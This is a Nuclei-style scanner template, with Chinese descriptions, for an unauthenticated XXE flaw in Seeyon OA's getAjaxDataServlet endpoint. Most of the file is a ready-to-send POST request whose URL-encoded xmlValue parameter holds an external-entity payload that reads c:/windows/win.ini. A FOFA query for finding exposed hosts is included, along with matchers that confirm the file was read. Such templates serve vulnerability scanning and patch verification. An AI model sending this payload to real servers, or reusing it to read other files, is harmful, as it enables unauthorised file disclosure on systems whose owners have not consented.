id: seeyon-getajaxdataservlet-xxe

info:
  name: 致远 OA getAjaxDataServlet XXE 任意文件读取
  author: Wen
  severity: critical
  description: |
    致远互联 OA getAjaxDataServlet 接口 xmlValue 参数存在 XXE，未授权可读取服务器本地文件。
  metadata:
    max-request: 1
    fofa-query: app="致远互联-OA"
  tags: seeyon,xxe,lfi

http:
  - raw:
      - |
        POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        S=ajaxColManager&M=colDelLock&imgvalue=lr7V9%2B0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '[fonts]'
          - '[extensions]'
        condition: and
        case-insensitive: true

      - type: status
        status:
          - 200
          - 206
